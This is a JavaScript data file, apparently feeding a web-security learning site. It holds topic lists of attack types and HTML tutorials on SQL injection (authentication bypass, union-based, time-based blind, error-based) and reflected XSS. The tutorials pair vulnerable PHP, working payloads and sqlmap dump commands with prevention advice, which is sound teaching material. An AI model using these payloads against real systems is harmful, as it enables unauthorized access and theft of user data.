const allVulnerabilities = [
    
 {
    "id": 1,
    "title": "local cach",
    "summary": `
SQL Injection Authentication Bypass ,
Blind SQL Injection , 
Union Based SQL Injection ,
Time-Based Blind SQL Injection ,
Error-Based SQL Injection ,
Cross Site Scripting XSS Reflected ,
Stored XSS ,
DOM Based XSS في JavaScript ,
File Upload Vulnerability ,
Remote File Inclusion RFI ,
Local File Inclusion LFI , 
Directory Traversal Attack ,
Command Injection Linux ,
OS Command Injection في Windows ,
Broken Authentication Vulnerability ,
Weak Password Attack ,
Brute Force Login Attack ,
Session Hijacking Cookies ,
Insecure Direct Object Reference IDOR ,
Broken Access Control ,
JWT Token Manipulation ,
JWT None Algorithm Exploit ,
Server Side Request Forgery SSRF ,
XML External Entity XXE ,`
 },

 {
    "id": 2,
    "title": "",
    "summary": `Insecure Deserialization Attack ,
CSRF Account Takeover ,
Clickjacking Attack ,
Open Redirect Vulnerability ,
HTTP Host Header Injection ,
Subdomain Takeover ,
SSTI Server Side Template Injection ,
Prototype Pollution JavaScript ,
Path Traversal APIs ,
API Rate Limit Bypass ,
NoSQL Injection MongoDB ,
LDAP Injection Attack , 
XPath Injection Vulnerability ,
Buffer Overflow Basics ,
Stack Buffer Overflow ,
Format String Vulnerability ,
Race Condition Exploit ,
Integer Overflow Vulnerability ,
Memory Corruption Basics ,
Reverse Shell Upload Attack ,
Web Shell Upload Vulnerability ,
Privilege Escalation Linux ,
Linux Sudo Misconfiguration ,
SUID Binary Exploitation ,
Cron Job Privilege Escalation ,
PATH Hijacking Linux ,
Kernel Exploitation Basics ,
Windows Privilege Escalation ,
Unquoted Service Path Vulnerability ,
DLL Hijacking Windows ,
AlwaysInstallElevated Exploit ,
SMB Enumeration Attack ,
SMB Relay Attack ,
NTLM Hash Capture ,
Pass The Hash Attack ,
Kerberoasting Active Directory ,
AS-REP Roasting Attack ,
Active Directory Enumeration ,
Golden Ticket Attack ,
Silver Ticket Attack ,
BloodHound Privilege Mapping ,
WiFi WPA2 Handshake Capture ,
Evil Twin WiFi Attack ,
Rogue Access Point Attack ,
DNS Spoofing Attack ,`
 },

 {
    "id": 3,
    "title": "",
    "summary": `ARP Spoofing , 
Man In The Middle Attack ,
Packet Sniffing Wireshark ,
FTP Anonymous Login Exploit ,
Telnet Misconfiguration ,
Misconfigured Docker Container ,
Docker Escape Basics , 
Kubernetes Misconfiguration ,
Exposed Git Repository Attack ,
Exposed .env File Vulnerability ,
Firebase Misconfiguration Leak ,
S3 Bucket Misconfiguration ,
Cloud Metadata SSRF Attack ,
GraphQL Introspection Exploit ,
OAuth Token Leakage ,
WebSocket Vulnerability Basics ,
XML Injection Attack ,
CRLF Injection Vulnerability ,
Email Header Injection ,
Insecure File Permissions ,
Source Code Disclosure Vulnerability ,
Backup File Exposure Attack ,
Information Disclosure Debug Mode ,
WordPress Plugin Exploitation ,
Joomla Component Exploitation ,
Drupal Module Vulnerability ,
Apache Misconfiguration Attack ,
Nginx Alias Traversal Vulnerability ,
Redis Unauthorized Access ,
Elasticsearch Open Database Exposure ,
Jenkins Remote Code Execution ,
`
 },

 {
    "id": 4,
    "title": "SQL Injection Authentication Bypass",
    "summary": `
        <p>The <b>SQL Injection Authentication Bypass</b> vulnerability is considered one of the most dangerous types of database injections. It allows an attacker to bypass the login page and access user accounts or the admin panel without knowing the actual password.</p>

        <p>This vulnerability occurs when an application builds SQL queries based directly on user input without proper sanitization or the use of safe queries (Prepared Statements).</p>

        <h3>How does the login mechanism usually work?</h3>

        <p>In most websites, the user is verified via a SQL query similar to the following:</p>

        <pre><code>SELECT * FROM users 
WHERE username = 'admin' 
AND password = '123456';</code></pre>

        <p>If the data matches the database, access is granted.</p>

        <h3>Security Issue:</h3>

        <p>If the application places user input directly into the query without protection, the attacker can modify the entire logic of the query.</p>

        <h3>Practical Example of Login Bypass:</h3>

        <p>The attacker enters the following value into the username field:</p>

        <pre><code>' OR '1'='1</code></pre>

        <p>And puts any value in the password field.</p>

        <p>The final query becomes:</p>

        <pre><code>SELECT * FROM users 
WHERE username = '' OR '1'='1' 
AND password = 'test';</code></pre>

        <p>Since the condition <code>'1'='1'</code> is always TRUE, the system may consider the verification successful and allow access without a valid password.</p>

        <h3>Common Payloads:</h3>

        <pre><code>' OR 1=1--
' OR '1'='1'--
admin' --
' OR ''='
" OR "1"="1
admin') OR ('1'='1</code></pre>

        <p>The <code>--</code> character is used in SQL to comment out the rest of the query, so the password condition is ignored.</p>

        <h3>Vulnerable Code Example:</h3>

        <pre><code>// PHP Example

$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users 
WHERE username='$username' 
AND password='$password'";

$result = mysqli_query($conn, $query);</code></pre>

        <p>The problem here is that the application merges user input directly into the query.</p>

        <h3>How does a tester detect this vulnerability?</h3>

        <p>The tester sends special characters into the login fields and monitors the application's behavior:</p>

        <pre><code>'
"
--
#</code></pre>

        <p>If SQL errors appear or authentication is bypassed, it means the system is vulnerable to injection.</p>

        <h3>Practical Test using Burp Suite:</h3>

        <pre><code>POST /login HTTP/1.1
Host: vulnerable-site.com

username=admin'--&password=test</code></pre>

        <p>If the login is successful, it indicates an Authentication Bypass vulnerability.</p>

        <h3>Damages resulting from the vulnerability:</h3>

        <p>1. Accessing user accounts without a password.</p>
        <p>2. Accessing the admin panel.</p>
        <p>3. Stealing sensitive data.</p>
        <p>4. Full control over the database.</p>
        <p>5. Deleting or modifying user information.</p>

        <h3>Correct Protection Methods:</h3>

        <p><b>1. Using Prepared Statements:</b></p>

        <pre><code>// Secure PHP PDO Example

$stmt = $pdo->prepare(
"SELECT * FROM users 
WHERE username = ? 
AND password = ?"
);

$stmt->execute([$username, $password]);</code></pre>

        <p><b>2. Sanitizing and validating user input.</b></p>

        <p><b>3. Not displaying SQL error messages to the user.</b></p>

        <p><b>4. Using modern ORM Frameworks.</b></p>

        <p><b>5. Applying the principle of least privilege to the database account.</b></p>

        <h3>Signs indicating the presence of SQL Injection:</h3>

        <pre><code>SQL syntax error
mysql_fetch
ORA-01756
Unclosed quotation mark
PDOException</code></pre>

        <p>The appearance of these messages often means that the application is handling user input in an unsafe manner.</p>

        <h3>Important Notes:</h3>

        <p>Although the Authentication Bypass vulnerability is considered one of the oldest vulnerabilities, it is still one of the most prevalent due to poor login system programming.</p>

        <p>Additionally, many Bug Bounty tests start by checking login fields to discover this type of vulnerability.</p>
    `
},

{
    "id": 5,
    "title": "Union Based SQL Injection",
    "summary": `
        <p><b>Union Based SQL Injection</b> is one of the most powerful database injection techniques. It relies on exploiting the <code>UNION SELECT</code> statement to combine the results of an attacker's query with the results of the original query executed by the application, allowing sensitive data to be displayed directly on the website page.</p>

        <h3>Why is this vulnerability dangerous?</h3>
        <p>It allows an attacker to extract sensitive data directly without needing to guess information, such as:</p>
        <ul>
            <li>Usernames and passwords.</li>
            <li>Email addresses and contact information.</li>
            <li>Database structure (table and column names).</li>
            <li>Database version and system information.</li>
        </ul>

        

        <h3>How the UNION statement works:</h3>
        <p>The <code>UNION</code> operator is used to combine the result sets of two or more <code>SELECT</code> statements into a single result set. For this to succeed, both queries must have the same number of columns.</p>
        <pre><code>SELECT column1 FROM table1
UNION
SELECT column2 FROM table2;</code></pre>

        <h3>Steps to Detect and Exploit:</h3>
        
        <p><b>1. Determine the number of columns:</b> You must find the number of columns in the original query. This is done using <code>ORDER BY</code>:</p>
        <pre><code>1' ORDER BY 1--
1' ORDER BY 2--
// Continue until an SQL error appears</code></pre>
        <p>Alternatively, use <code>NULL</code> values:</p>
        <pre><code>1' UNION SELECT NULL, NULL, NULL--</code></pre>

        <p><b>2. Identify displayable columns:</b> To see which column's data is reflected on the page:</p>
        <pre><code>1' UNION SELECT 1, 2, 3--</code></pre>
        <p>If the number "2" appears on the page, the second column is the correct path to display retrieved data.</p>

        <p><b>3. Data Extraction:</b></p>
        <ul>
            <li><b>Database Name:</b> <code>1' UNION SELECT database(), 2--</code></li>
            <li><b>Table Names:</b> <code>1' UNION SELECT table_name, 2 FROM information_schema.tables--</code></li>
            <li><b>Column Names:</b> <code>1' UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name='users'--</code></li>
            <li><b>Dumping Data:</b> <code>1' UNION SELECT username, password FROM users--</code></li>
        </ul>

        <h3>Practical Exploitation:</h3>
        <p><b>Via URL:</b></p>
        <pre><code>http://target.com/product.php?id=1'+UNION+SELECT+username,password+FROM+users--</code></pre>
        
        <p><b>Using Tools:</b> <b>SQLMap</b> is the most effective tool to automate this process:</p>
        <pre><code>sqlmap -u "http://target.com/product.php?id=1" --dbs
sqlmap -u "http://target.com/product.php?id=1" -D database_name -T users --dump</code></pre>

        <h3>Prevention Methods:</h3>
        <p>The definitive solution is to separate user input from the query logic:</p>
        <ol>
            <li><b>Use Prepared Statements (with Parameterized Queries):</b> This is the most critical defense against SQL injection.</li>
            <li><b>Strict Input Validation:</b> Ensure the data entered matches the expected type (e.g., verifying that an ID is purely numeric).</li>
            <li><b>Disable Database Error Reporting:</b> Never display raw SQL errors to the end-user to prevent system information leakage.</li>
            <li><b>Principle of Least Privilege:</b> Ensure the database account used by the application has only the minimum permissions necessary for its function.</li>
        </ol>

        <h3>Signs of Vulnerability:</h3>
        <ul>
            <li>SQL errors appearing when using special characters (', ", --, #).</li>
            <li>Unexpected changes in page content after injecting <code>UNION SELECT</code>.</li>
            <li>Error messages such as <code>Column count doesn't match</code> or <code>SQL syntax error</code>.</li>
        </ul>
    `
},

{
    "id": 6,
    "title": "Time-Based Blind SQL Injection",
    "summary": `
        <p><b>Time-Based Blind SQL Injection</b> is one of the most critical forms of "Blind" SQL injection. In this technique, the attacker does not see direct query results or error messages; instead, they infer information by observing the time the server takes to respond to their requests.</p>

        <p>Because the application does not return data directly, the attacker sends queries designed to force a time delay. If the server takes the specified amount of time to respond, the attacker confirms that the injected condition was TRUE.</p>

        <h3>How it works:</h3>
        <p>The attacker injects commands that force the database to "sleep" or pause for a specific duration. By measuring how long the page takes to load, they can confirm whether their injected logic was executed by the database.</p>
        
        

        <h3>Example of a Vulnerable Login Query:</h3>
        <pre><code>SELECT * FROM users 
WHERE username = 'admin' 
AND password = '123456';</code></pre>

        <h3>Practical Testing Example:</h3>
        <p>The attacker injects a sleep command into the username field:</p>
        <pre><code>admin' AND SLEEP(5)--</code></pre>
        <p>If the page takes 5 seconds to respond, the vulnerability is confirmed.</p>

        <h3>Database-Specific Delay Commands:</h3>
        <ul>
            <li><b>MySQL:</b> <code>SLEEP(5)</code></li>
            <li><b>Microsoft SQL Server:</b> <code>WAITFOR DELAY '0:0:5'</code></li>
            <li><b>PostgreSQL:</b> <code>pg_sleep(5)</code></li>
            <li><b>Oracle:</b> <code>DBMS_PIPE.RECEIVE_MESSAGE(('A'),5)</code></li>
        </ul>

        <h3>Testing Logic (TRUE vs. FALSE):</h3>
        <p>To confirm the vulnerability, the attacker tests both conditions:</p>
        <pre><code>// TRUE condition (Page delays)
admin' AND SLEEP(5)--

// FALSE condition (Page loads instantly)
admin' AND 1=2 AND SLEEP(5)--</code></pre>

        <h3>Extracting Data Character by Character:</h3>
        <p>Attackers can automate the extraction of data by testing one character at a time:</p>
        <pre><code>admin' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--</code></pre>
        <p>If the response is delayed, the first character of the database name is 'a'.</p>

        <h3>Practical Exploitation with Tools:</h3>
        <p><b>Burp Suite:</b> Monitor the "Response Time" column in the Burp Repeater to observe the intentional delays.</p>
        <p><b>SQLMap:</b> Automate the process using the time-based technique flag:</p>
        <pre><code>sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" --technique=T</code></pre>

        <h3>Prevention Methods:</h3>
        <p>To secure your application, you must prevent the query logic from being manipulated:</p>
        <ol>
            <li><b>Use Prepared Statements:</b> This is the most effective way to prevent all SQL injection types.</li>
            <li><b>Strict Input Validation:</b> Ensure inputs match the expected data format (e.g., numeric IDs).</li>
            <li><b>Hide Detailed Error Messages:</b> Ensure the application does not leak system information.</li>
            <li><b>Limit Query Execution Time:</b> Configure the database and web server to prevent long-running queries from lingering.</li>
            <li><b>Deploy a Web Application Firewall (WAF):</b> Detect and block common injection patterns.</li>
        </ol>

        <h3>Criticality:</h3>
        <p>While Time-Based SQLi is slower than other methods because it requires extracting data bit-by-bit, it is extremely dangerous because it succeeds even when the application is fully hardened against visible error messages or direct data leakage.</p>
    `
},

{
    "id": 7,
    "title": "Error-Based SQL Injection",
    "summary": `
        <p><b>Error-Based SQL Injection</b> is a technique where an attacker deliberately triggers database errors to force the application to reveal sensitive information within the error message itself.</p>

        <p>Instead of receiving data directly from the query, the attacker manipulates the input to force a syntax or processing error, which the database engine returns to the user, exposing details like database versions, table names, or file paths.</p>

        

        <h3>How it Works:</h3>
        <p>Applications are often configured to show detailed database error messages to users for debugging purposes. An attacker exploits this by injecting SQL functions that intentionally cause errors when they process dynamic data.</p>

        <h3>Practical Detection Example:</h3>
        <p>By adding a single quote (<code>'</code>) to a URL parameter, the application might leak an error:</p>
        <pre><code>http://target.com/product.php?id=1'</code></pre>
        <p>If a message like <code>"You have an error in your SQL syntax..."</code> appears, the application is likely vulnerable.</p>

        <h3>Common Exploitation Functions (MySQL):</h3>
        <p>Attackers use functions that evaluate and return data within an error message when they fail:</p>
        <ul>
            <li><b>extractvalue():</b> Often used to trigger XPath syntax errors that contain the injected data.</li>
            <li><b>updatexml():</b> Similar to <code>extractvalue()</code>, it causes errors when the input does not match expected XML structure.</li>
            <li><b>floor(rand()):</b> Used in group-by clauses to trigger duplicate key errors containing sensitive data.</li>
        </ul>

        <h3>Extraction Example (Database Version):</h3>
        <pre><code>1' AND extractvalue(1,concat(0x7e,version()))--</code></pre>
        <p><b>Resulting Error:</b> <code>XPATH syntax error: '~8.0.36'</code></p>

        <h3>Data Extraction Chain:</h3>
        <ul>
            <li><b>Database Name:</b> <code>1' AND extractvalue(1,concat(0x7e,database()))--</code></li>
            <li><b>Table Names:</b> <code>1' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 0,1)))--</code></li>
        </ul>

        <h3>Automation with SQLMap:</h3>
        <pre><code>sqlmap -u "http://target.com/product.php?id=1" --technique=E</code></pre>
        <p>The <code>--technique=E</code> flag forces SQLMap to focus specifically on Error-Based exploitation.</p>

        <h3>Prevention Methods:</h3>
        <p>Securing the application requires restricting the feedback provided to the user:</p>
        <ol>
            <li><b>Use Prepared Statements:</b> Always use parameterized queries to prevent input from being interpreted as code.</li>
            <li><b>Disable Verbose Error Messages:</b> Configure the production environment to hide SQL errors from users.</li>
            <li><b>Internal Logging:</b> Log all database errors to secure, internal files for developer review only.</li>
            <li><b>Input Sanitization:</b> Validate that inputs conform to expected formats (e.g., integer-only for IDs).</li>
            <li><b>Web Application Firewall (WAF):</b> Detect and filter malicious payloads before they reach the database.</li>
        </ol>

        <h3>Criticality:</h3>
        <p>Error-Based SQLi is highly dangerous because it provides a direct, low-effort communication channel for the attacker to query the database structure and content, making it a primary reconnaissance method for deeper system exploitation.</p>
    `
},

{
    "id": 8,
    "title": "Cross Site Scripting (XSS) Reflected",
    "summary": `
        <p><b>Reflected Cross-Site Scripting (Reflected XSS)</b> is one of the most common web application vulnerabilities. It occurs when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way (without proper validation or output encoding).</p>

        

        <p>This vulnerability allows an attacker to inject malicious JavaScript, which executes in the victim's browser when they click a crafted link or submit a malicious request.</p>

        <h3>How it Works:</h3>
        <p>The application takes a value from the user and reflects it directly onto the page. For example, in a search function:</p>
        <pre><code>http://target.com/search?q=phone</code></pre>
        <p>The application returns: <code>You searched for: phone</code>. If the application does not filter the <code>q</code> parameter, an attacker can inject a script instead of plain text.</p>

        <h3>Practical Exploitation:</h3>
        <pre><code>http://target.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
        <p>If vulnerable, the script executes within the victim's browser, triggering an alert box.</p>

        <h3>Why is it called "Reflected"?</h3>
        <p>Because the malicious script is not stored on the server (like in Stored XSS). Instead, it is "reflected" back from the web server to the victim's browser as part of the immediate HTTP response.</p>

        <h3>Common Attack Payloads:</h3>
        <pre><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;
&lt;img src=x onerror=alert(1)&gt;
&lt;svg onload=alert(1)&gt;
&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;</code></pre>

        <h3>Impacts:</h3>
        <ul>
            <li><b>Session Hijacking:</b> Stealing cookies via <code>document.cookie</code> (unless <code>HttpOnly</code> is set).</li>
            <li><b>Phishing:</b> Injecting fake login forms into the page.</li>
            <li><b>Unauthorized Actions:</b> Using the victim's session to perform actions, such as changing passwords or updating account details.</li>
        </ul>

        <h3>Automation and Detection:</h3>
        <p>Tools like <b>Burp Suite</b>, <b>XSStrike</b>, <b>Dalfox</b>, and <b>OWASP ZAP</b> are commonly used to detect where input is being reflected unsafely.</p>

        <h3>Prevention Methods:</h3>
        <p>To defend against Reflected XSS, developers must follow these secure coding practices:</p>
        <ol>
            <li><b>Output Encoding:</b> Convert special characters into their HTML entity equivalents (e.g., using <code>htmlspecialchars()</code> in PHP) before rendering them in the browser.</li>
            <li><b>Content Security Policy (CSP):</b> Implement a strict CSP to restrict the sources from which scripts can be loaded and executed.</li>
            <li><b>Use HttpOnly Cookies:</b> Prevents JavaScript from accessing sensitive session cookies.</li>
            <li><b>Input Validation:</b> Ensure that input conforms to expected formats (e.g., allowing only alphanumeric characters for search queries).</li>
            <li><b>Modern Frameworks:</b> Use frameworks like React, Angular, or Vue, which handle output encoding automatically by default.</li>
        </ol>

        <h3>Differences Between XSS Types:</h3>
        <ul>
            <li><b>Reflected XSS:</b> The payload is part of the request and reflected in the immediate response.</li>
            <li><b>Stored XSS:</b> The payload is saved to the database (e.g., in a comment or profile field) and served to all users.</li>
            <li><b>DOM-based XSS:</b> The vulnerability exists entirely in client-side code, where the script is executed by the browser's DOM manipulation.</li>
        </ul>
    `
},
];
